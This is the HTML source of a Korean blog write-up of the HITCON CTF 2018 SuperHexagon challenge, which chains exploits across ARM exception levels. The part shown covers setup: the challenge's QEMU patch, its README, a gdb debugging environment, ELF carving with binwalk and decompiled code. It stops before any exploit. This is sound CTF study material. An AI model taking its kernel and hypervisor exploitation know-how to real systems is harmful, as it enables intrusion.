<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>HITCON CTF 2018 - SuperHexagon | msh1307</title>
<meta name="keywords" content="HITCON 2018 SuperHexagon, Hypervisor Exploit, Kernel Exploit, Secure Monitor Exploit">
<meta name="description" content="오랜만에 한꺼번에 블로그 글을 쓰게 되었다. 이번년도 초에 공부를 목적으로 superhexagon을 풀었다. 글에서 언급하는 background 내용은 다른 글에서 따로 정리되어있다.
Overview diff -Naur &#39;--exclude=tests&#39; &#39;--exclude=roms&#39; &#39;--exclude=capstone&#39; &#39;--exclude=docs&#39; ../temp/qemu-3.0.0/hw/arm/hitcon.c qemu/hw/arm/hitcon.c --- ../temp/qemu-3.0.0/hw/arm/hitcon.c	1969-12-31 16:00:00.000000000 -0800 &#43;&#43;&#43; qemu/hw/arm/hitcon.c	2018-10-19 10:49:59.412023642 -0700 @@ -0,0 &#43;1,208 @@ &#43;#include &#34;qemu/osdep.h&#34; &#43;#include &#34;qapi/error.h&#34; &#43;#include &#34;qemu-common.h&#34; &#43;#include &#34;cpu.h&#34; &#43;#include &#34;hw/sysbus.h&#34; &#43;#include &#34;hw/devices.h&#34; &#43;#include &#34;hw/boards.h&#34; &#43;#include &#34;hw/arm/arm.h&#34; &#43;#include &#34;hw/misc/arm_integrator_debug.h&#34; &#43;#include &#34;net/net.h&#34; &#43;#include &#34;exec/address-spaces.h&#34; &#43;#include &#34;sysemu/sysemu.h&#34; &#43;#include &#34;qemu/error-report.h&#34; &#43;#include &#34;hw/char/pl011.">
<meta name="author" content="">
<link rel="canonical" href="https://msh1307.kr/blog/hitcon_2018_superhexagon/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.d9c43e0c7cae3b38c51e79921ad3cf2685d9811a56593a817d9b57ac4fdebf2b.css" integrity="sha256-2cQ&#43;DHyuOzjFHnmSGtPPJoXZgRpWWTqBfZtXrE/evys=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js" integrity="sha256-uVus3DnjejMqn4g7Hni&#43;Srwf3KK8HyZB9V4809q9TWE="
    onload="hljs.initHighlightingOnLoad();"></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-BR89V2WEC0');
</script>
<link rel="icon" href="https://msh1307.kr/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://msh1307.kr/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://msh1307.kr/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://msh1307.kr/apple-touch-icon.png">
<link rel="mask-icon" href="https://msh1307.kr/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="HITCON CTF 2018 - SuperHexagon" />
<meta property="og:description" content="오랜만에 한꺼번에 블로그 글을 쓰게 되었다. 이번년도 초에 공부를 목적으로 superhexagon을 풀었다. 글에서 언급하는 background 내용은 다른 글에서 따로 정리되어있다.
Overview diff -Naur &#39;--exclude=tests&#39; &#39;--exclude=roms&#39; &#39;--exclude=capstone&#39; &#39;--exclude=docs&#39; ../temp/qemu-3.0.0/hw/arm/hitcon.c qemu/hw/arm/hitcon.c --- ../temp/qemu-3.0.0/hw/arm/hitcon.c	1969-12-31 16:00:00.000000000 -0800 &#43;&#43;&#43; qemu/hw/arm/hitcon.c	2018-10-19 10:49:59.412023642 -0700 @@ -0,0 &#43;1,208 @@ &#43;#include &#34;qemu/osdep.h&#34; &#43;#include &#34;qapi/error.h&#34; &#43;#include &#34;qemu-common.h&#34; &#43;#include &#34;cpu.h&#34; &#43;#include &#34;hw/sysbus.h&#34; &#43;#include &#34;hw/devices.h&#34; &#43;#include &#34;hw/boards.h&#34; &#43;#include &#34;hw/arm/arm.h&#34; &#43;#include &#34;hw/misc/arm_integrator_debug.h&#34; &#43;#include &#34;net/net.h&#34; &#43;#include &#34;exec/address-spaces.h&#34; &#43;#include &#34;sysemu/sysemu.h&#34; &#43;#include &#34;qemu/error-report.h&#34; &#43;#include &#34;hw/char/pl011." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://msh1307.kr/blog/hitcon_2018_superhexagon/" /><meta property="article:section" content="blog" />
<meta property="article:published_time" content="2024-06-25T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2024-06-25T00:00:00&#43;00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="HITCON CTF 2018 - SuperHexagon"/>
<meta name="twitter:description" content="오랜만에 한꺼번에 블로그 글을 쓰게 되었다. 이번년도 초에 공부를 목적으로 superhexagon을 풀었다. 글에서 언급하는 background 내용은 다른 글에서 따로 정리되어있다.
Overview diff -Naur &#39;--exclude=tests&#39; &#39;--exclude=roms&#39; &#39;--exclude=capstone&#39; &#39;--exclude=docs&#39; ../temp/qemu-3.0.0/hw/arm/hitcon.c qemu/hw/arm/hitcon.c --- ../temp/qemu-3.0.0/hw/arm/hitcon.c	1969-12-31 16:00:00.000000000 -0800 &#43;&#43;&#43; qemu/hw/arm/hitcon.c	2018-10-19 10:49:59.412023642 -0700 @@ -0,0 &#43;1,208 @@ &#43;#include &#34;qemu/osdep.h&#34; &#43;#include &#34;qapi/error.h&#34; &#43;#include &#34;qemu-common.h&#34; &#43;#include &#34;cpu.h&#34; &#43;#include &#34;hw/sysbus.h&#34; &#43;#include &#34;hw/devices.h&#34; &#43;#include &#34;hw/boards.h&#34; &#43;#include &#34;hw/arm/arm.h&#34; &#43;#include &#34;hw/misc/arm_integrator_debug.h&#34; &#43;#include &#34;net/net.h&#34; &#43;#include &#34;exec/address-spaces.h&#34; &#43;#include &#34;sysemu/sysemu.h&#34; &#43;#include &#34;qemu/error-report.h&#34; &#43;#include &#34;hw/char/pl011."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Blogs",
      "item": "https://msh1307.kr/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "HITCON CTF 2018 - SuperHexagon",
      "item": "https://msh1307.kr/blog/hitcon_2018_superhexagon/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "HITCON CTF 2018 - SuperHexagon",
  "name": "HITCON CTF 2018 - SuperHexagon",
  "description": "오랜만에 한꺼번에 블로그 글을 쓰게 되었다. 이번년도 초에 공부를 목적으로 superhexagon을 풀었다. 글에서 언급하는 background 내용은 다른 글에서 따로 정리되어있다.\nOverview diff -Naur \u0026#39;--exclude=tests\u0026#39; \u0026#39;--exclude=roms\u0026#39; \u0026#39;--exclude=capstone\u0026#39; \u0026#39;--exclude=docs\u0026#39; ../temp/qemu-3.0.0/hw/arm/hitcon.c qemu/hw/arm/hitcon.c --- ../temp/qemu-3.0.0/hw/arm/hitcon.c\t1969-12-31 16:00:00.000000000 -0800 +++ qemu/hw/arm/hitcon.c\t2018-10-19 10:49:59.412023642 -0700 @@ -0,0 +1,208 @@ +#include \u0026#34;qemu/osdep.h\u0026#34; +#include \u0026#34;qapi/error.h\u0026#34; +#include \u0026#34;qemu-common.h\u0026#34; +#include \u0026#34;cpu.h\u0026#34; +#include \u0026#34;hw/sysbus.h\u0026#34; +#include \u0026#34;hw/devices.h\u0026#34; +#include \u0026#34;hw/boards.h\u0026#34; +#include \u0026#34;hw/arm/arm.h\u0026#34; +#include \u0026#34;hw/misc/arm_integrator_debug.h\u0026#34; +#include \u0026#34;net/net.h\u0026#34; +#include \u0026#34;exec/address-spaces.h\u0026#34; +#include \u0026#34;sysemu/sysemu.h\u0026#34; +#include \u0026#34;qemu/error-report.h\u0026#34; +#include \u0026#34;hw/char/pl011.",
  "keywords": [
    "HITCON 2018 SuperHexagon", "Hypervisor Exploit", "Kernel Exploit", "Secure Monitor Exploit"
  ],
  "articleBody": "오랜만에 한꺼번에 블로그 글을 쓰게 되었다. 이번년도 초에 공부를 목적으로 superhexagon을 풀었다. 글에서 언급하는 background 내용은 다른 글에서 따로 정리되어있다.\nOverview diff -Naur '--exclude=tests' '--exclude=roms' '--exclude=capstone' '--exclude=docs' ../temp/qemu-3.0.0/hw/arm/hitcon.c qemu/hw/arm/hitcon.c --- ../temp/qemu-3.0.0/hw/arm/hitcon.c\t1969-12-31 16:00:00.000000000 -0800 +++ qemu/hw/arm/hitcon.c\t2018-10-19 10:49:59.412023642 -0700 @@ -0,0 +1,208 @@ +#include \"qemu/osdep.h\" +#include \"qapi/error.h\" +#include \"qemu-common.h\" +#include \"cpu.h\" +#include \"hw/sysbus.h\" +#include \"hw/devices.h\" +#include \"hw/boards.h\" +#include \"hw/arm/arm.h\" +#include \"hw/misc/arm_integrator_debug.h\" +#include \"net/net.h\" +#include \"exec/address-spaces.h\" +#include \"sysemu/sysemu.h\" +#include \"qemu/error-report.h\" +#include \"hw/char/pl011.h\" +#include \"hw/loader.h\" +#include \"hw/intc/arm_gic_common.h\" + +typedef struct MemMapEntry { + hwaddr base; + hwaddr size; +} MemMapEntry; + +enum { + VIRT_FLASH, + VIRT_CPUPERIPHS, + VIRT_MEM, + VIRT_SECURE_MEM, + VIRT_UART, +}; + +#define RAMLIMIT_GB 3 +#define RAMLIMIT_BYTES (RAMLIMIT_GB * 1024ULL * 1024 * 1024) +static const MemMapEntry memmap[] = { + /* Space up to 0x8000000 is reserved for a boot ROM */ + [VIRT_FLASH] = { 0, 0x08000000 }, + [VIRT_CPUPERIPHS] = { 0x08000000, 0x00020000 }, + [VIRT_UART] = { 0x09000000, 0x00001000 }, + [VIRT_SECURE_MEM] = { 0x0e000000, 0x01000000 }, + [VIRT_MEM] = { 0x40000000, RAMLIMIT_BYTES }, +}; + +static const char *valid_cpus[] = { + ARM_CPU_TYPE_NAME(\"hitcon\"), +}; + +static bool cpu_type_valid(const char *cpu) +{ + int i; + for (i = 0; i \u003c ARRAY_SIZE(valid_cpus); i++) { + if (strcmp(cpu, valid_cpus[i]) == 0) { + return true; + } + } + return false; +} + +static void create_one_flash(const char *name, hwaddr flashbase, + hwaddr flashsize, const char *file, + MemoryRegion *sysmem) +{ + /* Create and map a single flash device. We use the same + * parameters as the flash devices on the Versatile Express board. + */ + DriveInfo *dinfo = drive_get_next(IF_PFLASH); + DeviceState *dev = qdev_create(NULL, \"cfi.pflash01\"); + SysBusDevice *sbd = SYS_BUS_DEVICE(dev); + const uint64_t sectorlength = 256 * 1024; + + if (dinfo) { + qdev_prop_set_drive(dev, \"drive\", blk_by_legacy_dinfo(dinfo), + \u0026error_abort); + } + + qdev_prop_set_uint32(dev, \"num-blocks\", flashsize / sectorlength); + qdev_prop_set_uint64(dev, \"sector-length\", sectorlength); + qdev_prop_set_uint8(dev, \"width\", 4); + qdev_prop_set_uint8(dev, \"device-width\", 2); + qdev_prop_set_bit(dev, \"big-endian\", false); + qdev_prop_set_uint16(dev, \"id0\", 0x89); + qdev_prop_set_uint16(dev, \"id1\", 0x18); + qdev_prop_set_uint16(dev, \"id2\", 0x00); + qdev_prop_set_uint16(dev, \"id3\", 0x00); + qdev_prop_set_string(dev, \"name\", name); + qdev_init_nofail(dev); + + memory_region_add_subregion(sysmem, flashbase, + sysbus_mmio_get_region(SYS_BUS_DEVICE(dev), 0)); + + if (file) { + char *fn; + int image_size; + + if (drive_get(IF_PFLASH, 0, 0)) { + error_report(\"The contents of the first flash device may be \" + \"specified with -bios or with -drive if=pflash... \" + \"but you cannot use both options at once\"); + exit(1); + } + fn = qemu_find_file(QEMU_FILE_TYPE_BIOS, file); + if (!fn) { + error_report(\"Could not find ROM image '%s'\", file); + exit(1); + } + image_size = load_image_mr(fn, sysbus_mmio_get_region(sbd, 0)); + g_free(fn); + if (image_size \u003c 0) { + error_report(\"Could not load ROM image '%s'\", file); + exit(1); + } + } +} + +static void create_uart(int uart, MemoryRegion *mem, Chardev *chr) +{ + hwaddr base = memmap[uart].base; + DeviceState *dev = qdev_create(NULL, \"pl011\"); + SysBusDevice *s = SYS_BUS_DEVICE(dev); + qdev_prop_set_chr(dev, \"chardev\", chr); + qdev_init_nofail(dev); + memory_region_add_subregion(mem, base, sysbus_mmio_get_region(s, 0)); +} + +static struct arm_boot_info bootinfo; + +static void hitcon_init(MachineState *machine) +{ + MemoryRegion *sysmem = get_system_memory(); + MemoryRegion *secure_sysmem = NULL; + + if (!cpu_type_valid(machine-\u003ecpu_type)) { + error_report(\"mach-hitcon: CPU type %s not supported\", machine-\u003ecpu_type); + exit(1); + } + + if (machine-\u003eram_size != memmap[VIRT_MEM].size) { + error_report(\"mach-virt: NS RAM must be %dGB\", RAMLIMIT_GB); + exit(1); + } + + if(!bios_name) { + error_report(\"mach-hitcon: BIOS bin does not exist\"); + exit(1); + } + + // prepare secure memory + secure_sysmem = g_new(MemoryRegion, 1); + memory_region_init(secure_sysmem, OBJECT(machine), \"secure-memory\", UINT64_MAX); + memory_region_add_subregion_overlap(secure_sysmem, 0, sysmem, -1); + + // prepare cpu + Object *cpuobj = object_new(ARM_CPU_TYPE_NAME(\"hitcon\")); + object_property_set_int(cpuobj, (0x9 \u003c\u003c 8), \"mp-affinity\", NULL); + object_property_set_bool(cpuobj, true, \"has_el3\", NULL); + object_property_set_bool(cpuobj, true, \"has_el2\", NULL); + object_property_set_bool(cpuobj, false, \"pmu\", NULL); + object_property_find(cpuobj, \"reset-cbar\", NULL); + object_property_set_int(cpuobj, memmap[VIRT_CPUPERIPHS].base, \"reset-cbar\", \u0026error_abort); + object_property_set_link(cpuobj, OBJECT(sysmem), \"memory\", \u0026error_abort); + object_property_set_link(cpuobj, OBJECT(secure_sysmem), \"secure-memory\", \u0026error_abort); + object_property_set_bool(cpuobj, true, \"realized\", \u0026error_fatal); + object_unref(cpuobj); + + // prepare ram / rom + MemoryRegion *ram = g_new(MemoryRegion, 1); + memory_region_allocate_system_memory(ram, NULL, \"mach-hitcon.ram\", machine-\u003eram_size); + memory_region_add_subregion(sysmem, memmap[VIRT_MEM].base, ram); + + hwaddr flashsize = memmap[VIRT_FLASH].size / 2; + hwaddr flashbase = memmap[VIRT_FLASH].base; + create_one_flash(\"hitcon.flash0\", flashbase, flashsize, bios_name, secure_sysmem); + create_one_flash(\"hitcon.flash1\", flashbase + flashsize, flashsize, NULL, sysmem); + + MemoryRegion *secram = g_new(MemoryRegion, 1); + hwaddr base = memmap[VIRT_SECURE_MEM].base; + hwaddr size = memmap[VIRT_SECURE_MEM].size; + memory_region_init_ram(secram, NULL, \"hitcon.secure-ram\", size, \u0026error_fatal); + memory_region_add_subregion(secure_sysmem, base, secram); + + // GIC \u0026 UART + create_uart(VIRT_UART, sysmem, serial_hd(0)); + + + // prepare boot info + bootinfo.ram_size = machine-\u003eram_size; + bootinfo.nb_cpus = 1; + bootinfo.board_id = -1; + bootinfo.firmware_loaded = true; + bootinfo.loader_start = memmap[VIRT_MEM].base; + bootinfo.kernel_filename = machine-\u003ekernel_filename; + bootinfo.kernel_cmdline = machine-\u003ekernel_cmdline; + bootinfo.initrd_filename = machine-\u003einitrd_filename; + bootinfo.skip_dtb_autoload = true; + arm_load_kernel(ARM_CPU(first_cpu), \u0026bootinfo); +} + +static void hitcon_machine_init(MachineClass *mc) +{ + mc-\u003edesc = \"HITCON CTF Virtual Machine\"; + mc-\u003einit = hitcon_init; + mc-\u003emax_cpus = 1; + mc-\u003emin_cpus = 1; + mc-\u003edefault_cpus = 1; + mc-\u003edefault_ram_size = RAMLIMIT_BYTES; + mc-\u003eignore_memory_transaction_failures = true; + mc-\u003edefault_cpu_type = ARM_CPU_TYPE_NAME(\"hitcon\"); +} + +DEFINE_MACHINE(\"hitcon\", hitcon_machine_init) DEFINE_MACHINE으로 hitcon machine을 정의한다. 여기서 메모리 계층이 약간 신기하게 되어있다. qemu 메모리는 기본적으로 메모리 계층? 처럼 region과 그에 대한 subregion으로 구성된다. 이러한 region들은 각자의 priority를 가지며 낮은 priority 일수록 참조가 우선된다.\n+#define RAMLIMIT_GB 3 +#define RAMLIMIT_BYTES (RAMLIMIT_GB * 1024ULL * 1024 * 1024) +static const MemMapEntry memmap[] = { + /* Space up to 0x8000000 is reserved for a boot ROM */ + [VIRT_FLASH] = { 0, 0x08000000 }, + [VIRT_CPUPERIPHS] = { 0x08000000, 0x00020000 }, + [VIRT_UART] = { 0x09000000, 0x00001000 }, + [VIRT_SECURE_MEM] = { 0x0e000000, 0x01000000 }, + [VIRT_MEM] = { 0x40000000, RAMLIMIT_BYTES }, +}; 위와 같은 물리 메모리 맵을 가지게 된다\ndiff -Naur '--exclude=tests' '--exclude=roms' '--exclude=capstone' '--exclude=docs' ../temp/qemu-3.0.0/hw/arm/Makefile.objs qemu/hw/arm/Makefile.objs --- ../temp/qemu-3.0.0/hw/arm/Makefile.objs\t2018-08-14 12:10:34.000000000 -0700 +++ qemu/hw/arm/Makefile.objs\t2018-09-11 00:59:23.915929581 -0700 @@ -1,4 +1,4 @@ -obj-y += boot.o virt.o sysbus-fdt.o +obj-y += boot.o virt.o sysbus-fdt.o hitcon.o obj-$(CONFIG_ACPI) += virt-acpi-build.o obj-$(CONFIG_DIGIC) += digic_boards.o obj-$(CONFIG_EXYNOS4) += exynos4_boards.o diff -Naur '--exclude=tests' '--exclude=roms' '--exclude=capstone' '--exclude=docs' ../temp/qemu-3.0.0/hw/char/pl011.c qemu/hw/char/pl011.c --- ../temp/qemu-3.0.0/hw/char/pl011.c\t2018-08-14 12:10:34.000000000 -0700 +++ qemu/hw/char/pl011.c\t2018-10-19 16:34:07.692477202 -0700 @@ -94,6 +94,7 @@ r = s-\u003ersr; break; case 6: /* UARTFR */ + usleep(10); r = s-\u003eflags; break; case 8: /* UARTILPR */ diff -Naur '--exclude=tests' '--exclude=roms' '--exclude=capstone' '--exclude=docs' ../temp/qemu-3.0.0/target/arm/cpu64.c qemu/target/arm/cpu64.c --- ../temp/qemu-3.0.0/target/arm/cpu64.c\t2018-08-14 12:10:35.000000000 -0700 +++ qemu/target/arm/cpu64.c\t2018-10-19 16:26:20.955912362 -0700 @@ -256,6 +256,127 @@ } } +#define FLAG \"/home/super_hexagon/flag/\" + +static uint64_t hitcon_flag_word_idx_read(CPUARMState *env, + const ARMCPRegInfo *ri, int idx) +{ + int el = arm_current_el(env); + bool is_secure = arm_is_secure(env); + assert(el \u003e= 0 \u0026\u0026 el \u003c= 3); + const char *flag_name; + if (el == 3) { + flag_name = FLAG\"6\"; + } else if (el == 2) { + flag_name = FLAG\"3\"; + } else if (el == 1) { + if (is_secure) { + flag_name = FLAG\"5\"; + } else { + flag_name = FLAG\"2\"; + } + } else { + if (is_secure) { + flag_name = FLAG\"4\"; + } else { + flag_name = FLAG\"1\"; + } + } + int fd = open(flag_name, O_RDONLY); + assert(fd \u003e= 0); + assert(idx \u003e= 0 \u0026\u0026 idx \u003c 8); + uint32_t value[8]; + memset(value, 0, sizeof(value)); + read(fd, \u0026value, sizeof(value)); + close(fd); + return value[idx]; +} + +static uint64_t hitcon_flag_word_0_read(CPUARMState *env, const ARMCPRegInfo *ri) +{ + return hitcon_flag_word_idx_read(env, ri, 0); +} + +static uint64_t hitcon_flag_word_1_read(CPUARMState *env, const ARMCPRegInfo *ri) +{ + return hitcon_flag_word_idx_read(env, ri, 1); +} + +static uint64_t hitcon_flag_word_2_read(CPUARMState *env, const ARMCPRegInfo *ri) +{ + return hitcon_flag_word_idx_read(env, ri, 2); +} + +static uint64_t hitcon_flag_word_3_read(CPUARMState *env, const ARMCPRegInfo *ri) +{ + return hitcon_flag_word_idx_read(env, ri, 3); +} + +static uint64_t hitcon_flag_word_4_read(CPUARMState *env, const ARMCPRegInfo *ri) +{ + return hitcon_flag_word_idx_read(env, ri, 4); +} + +static uint64_t hitcon_flag_word_5_read(CPUARMState *env, const ARMCPRegInfo *ri) +{ + return hitcon_flag_word_idx_read(env, ri, 5); +} + +static uint64_t hitcon_flag_word_6_read(CPUARMState *env, const ARMCPRegInfo *ri) +{ + return hitcon_flag_word_idx_read(env, ri, 6); +} + +static uint64_t hitcon_flag_word_7_read(CPUARMState *env, const ARMCPRegInfo *ri) +{ + return hitcon_flag_word_idx_read(env, ri, 7); +} + +static void aarch64_hitcon_initfn(Object *obj) +{ + ARMCPU *cpu = ARM_CPU(obj); + + aarch64_a57_initfn(obj); + + ARMCPRegInfo hitcon_flag_reginfo[] = { + { .name = \"FLAG_WORD_0\", .state = ARM_CP_STATE_BOTH, + .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 0, + .access = PL0_RW, + .readfn = hitcon_flag_word_0_read, .writefn = arm_cp_write_ignore }, + { .name = \"FLAG_WORD_1\", .state = ARM_CP_STATE_BOTH, + .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 1, + .access = PL0_RW, + .readfn = hitcon_flag_word_1_read, .writefn = arm_cp_write_ignore }, + { .name = \"FLAG_WORD_2\", .state = ARM_CP_STATE_BOTH, + .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 2, + .access = PL0_RW, + .readfn = hitcon_flag_word_2_read, .writefn = arm_cp_write_ignore }, + { .name = \"FLAG_WORD_3\", .state = ARM_CP_STATE_BOTH, + .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 3, + .access = PL0_RW, + .readfn = hitcon_flag_word_3_read, .writefn = arm_cp_write_ignore }, + { .name = \"FLAG_WORD_4\", .state = ARM_CP_STATE_BOTH, + .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 4, + .access = PL0_RW, + .readfn = hitcon_flag_word_4_read, .writefn = arm_cp_write_ignore }, + { .name = \"FLAG_WORD_5\", .state = ARM_CP_STATE_BOTH, + .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 5, + .access = PL0_RW, + .readfn = hitcon_flag_word_5_read, .writefn = arm_cp_write_ignore }, + { .name = \"FLAG_WORD_6\", .state = ARM_CP_STATE_BOTH, + .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 6, + .access = PL0_RW, + .readfn = hitcon_flag_word_6_read, .writefn = arm_cp_write_ignore }, + { .name = \"FLAG_WORD_7\", .state = ARM_CP_STATE_BOTH, + .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 7, + .access = PL0_RW, + .readfn = hitcon_flag_word_7_read, .writefn = arm_cp_write_ignore }, + REGINFO_SENTINEL + }; + + define_arm_cp_regs(cpu, hitcon_flag_reginfo); +} + typedef struct ARMCPUInfo { const char *name; void (*initfn)(Object *obj); @@ -266,6 +387,7 @@ { .name = \"cortex-a57\", .initfn = aarch64_a57_initfn }, { .name = \"cortex-a53\", .initfn = aarch64_a53_initfn }, { .name = \"max\", .initfn = aarch64_max_initfn }, + { .name = \"hitcon\", .initfn = aarch64_hitcon_initfn }, { .name = NULL } }; diff -Naur '--exclude=tests' '--exclude=roms' '--exclude=capstone' '--exclude=docs' ../temp/qemu-3.0.0/target/arm/op_helper.c qemu/target/arm/op_helper.c --- ../temp/qemu-3.0.0/target/arm/op_helper.c\t2018-08-14 12:10:35.000000000 -0700 +++ qemu/target/arm/op_helper.c\t2018-10-19 17:53:05.141725519 -0700 @@ -433,7 +433,7 @@ cs-\u003eexception_index = EXCP_HLT; cs-\u003ehalted = 1; - cpu_loop_exit(cs); + exit(0); } void HELPER(wfe)(CPUARMState *env) 시스템 레지스터를 읽어서 Exception level 별로 flag를 읽을 수 있다.\n===================== Super Hexagon ===================== 1. Flags have to be read from 8 sysregs: s3_3_c15_c12_0 ~ s3_3_c15_c12_7 For example, in aarch64, you may use: mrs x0, s3_3_c15_c12_0 mrs x1, s3_3_c15_c12_1 . . . mrs x7, s3_3_c15_c12_7 For first two stages, EL0 and EL1, `print_flag' functions are included. Make good use of them. qemu-system-aarch64, based on qemu-3.0.0, is also patched to support this feature. See `qemu.patch' for more details. 2. You may add `-S -s' to qemu-system-aarch64 and debug with gdb-multiarch. However, if you want to debug ARM binary, you have to patch QEMU, since it always give AArch64 debug information. See `qemu-arm-debug.patch'. Besides, latest gdb 8.2 may be less buggy. README에서 어떤식으로 flag를 얻을 수 있는지 나와있다. 편의를 위해 모든 level 별로 flag를 읽는 함수가 정의되어있다.\nexploit 순서는 위와 같다. 각 EL 마다 취약점을 찾아서 익스플로잇하는게 주요 컨셉이다.\nDebugging environment docker compose 파일에서 SYS_PTRACE와 1234 포트를 열어서 리모트 디버깅 환경을 구축했다. 그리고 run.sh에 -s 옵션을 추가로 주도록 수정하면 된다.\nservices: super_hexagon: build: ./ volumes: - ./share:/home/super_hexagon:ro - ./xinetd:/etc/xinetd.d/super_hexagon:ro - ./tmp:/tmp:ro ports: - \"6666:6666\" - \"1234:1234\" expose: - \"6666\" - \"1234\" cap_add: - SYS_PTRACE 나중에 부득이하게 secure 물리 메모리도 확인해야해서 로컬에서도 디렉토리 구조를 만들어주고 run.sh를 수정했다.\n#!/bin/sh /home/super_hexagon/qemu-system-aarch64 -nographic -machine hitcon -cpu hitcon -bios /home/super_hexagon/bios.bin -monitor /dev/null 2\u003e/dev/null -serial null -s -S EL0, Non-secure application Carving an ELF binary \u003e nc localhost 6666 NOTICE: UART console initialized INFO: MMU: Mapping 0 - 0x2844 (783) INFO: MMU: Mapping 0xe000000 - 0xe204000 (40000000000703) INFO: MMU: Mapping 0x9000000 - 0x9001000 (40000000000703) NOTICE: MMU enabled NOTICE: BL1: HIT-BOOT v1.0 INFO: BL1: RAM 0xe000000 - 0xe204000 INFO: SCTLR_EL3: 30c5083b INFO: SCR_EL3: 00000738 INFO: Entry point address = 0x40100000 INFO: SPSR = 0x3c9 VERBOSE: Argument #0 = 0x0 VERBOSE: Argument #1 = 0x0 VERBOSE: Argument #2 = 0x0 VERBOSE: Argument #3 = 0x0 NOTICE: UART console initialized [VMM] RO_IPA: 00000000-0000c000 [VMM] RW_IPA: 0000c000-0003c000 [KERNEL] mmu enabled INFO: TEE PC: e400000 INFO: TEE SPSR: 1d3 NOTICE: TEE OS initialized [KERNEL] Starting user program ... === Trusted Keystore === Command: 0 - Load key 1 - Save key cmd\u003e 접속을 해보면, 부팅이 되면서 위의 유저 어플리케이션이 나온다.\nbios.bin에서 리버스 엔지니어링 없이 유저 어플리케이션을 카빙할 수 있을지부터 확인했다.\n\u003e binwalk bios.bin DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 143472 0x23070 SHA256 hash constants, little endian 770064 0xBC010 ELF, 64-bit LSB executable, version 1 (SYSV) 792178 0xC1672 Unix path: /lib/libc/aarch64 792711 0xC1887 Unix path: /lib/libc/aarch64 794111 0xC1DFF Unix path: /lib/libc/aarch64 796256 0xC2660 Unix path: /home/seanwu/hitcon-ctf-2018 \u003e file BC010 BC010: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), statically linked, with debug_info, not stripped ELF 바이너리가 그대로 들어있어서 이를 추출해서 분석을 시작했다.\nint main(void) { int iVar1; intro(); load_trustlet(\u0026TA_BIN,0x750); cmdtb[0] = cmd_load; cmdtb[1] = cmd_save; buf = (char *)mmap((void *)0x0,0x1000,0b00000011,0,0,-1); for (iVar1 = 0; iVar1 \u003c 10; iVar1 = iVar1 + 1) { run(); } return 0; } void load_trustlet(char *base,int size) { int iVar1; uint ta_mem_s; int result; uint uVar2; uint tci_mem_s; void *__dest; char *ta_mem; TCI *pTVar3; void *tci_mem; ulong __len; __len = (ulong)(size + 0xfff) \u0026 0xfffff000; __dest = mmap((void *)0x0,__len,3,0,0,-1); iVar1 = tc_register_wsm(__dest,__len); if (iVar1 == -1) { printf(\"tc_register_wsm: failed to register world shared memory\\n\"); /* WARNING: Subroutine does not return */ exit(-1); } memcpy(__dest,base,(long)size); iVar1 = tc_init_trustlet(iVar1,size); if (iVar1 == 0) { pTVar3 = (TCI *)mmap((void *)0x0,0x1000,3,0,0,-1); uVar2 = tc_register_wsm(pTVar3,0x1000); if (uVar2 != 0xffffffff) { tci_buf = pTVar3; tci_handle = uVar2; return; } printf(\"tc_register_wsm: failed to register world shared memory\\n\"); /* WARNING: Subroutine does not return */ exit(-1); } printf(\"tc_init_trustlet: failed to load trustlet\\n\"); /* WARNING: Subroutine does not return */ exit(-1); } ************************************************************* * FUNCTION ************************************************************* undefined tc_register_wsm () undefined w0:1 \u003cRETURN\u003e tc_register_wsm XREF[3]: Entry Point (*) , load_trustlet:00400174 (c) , load_trustlet:004001c8 (c) 00401b84 68 00 80 d2 mov x8,#0x3 00401b88 08 e0 bf f2 movk x8,#0xff00 , LSL #16 00401b8c 01 00 00 d4 svc 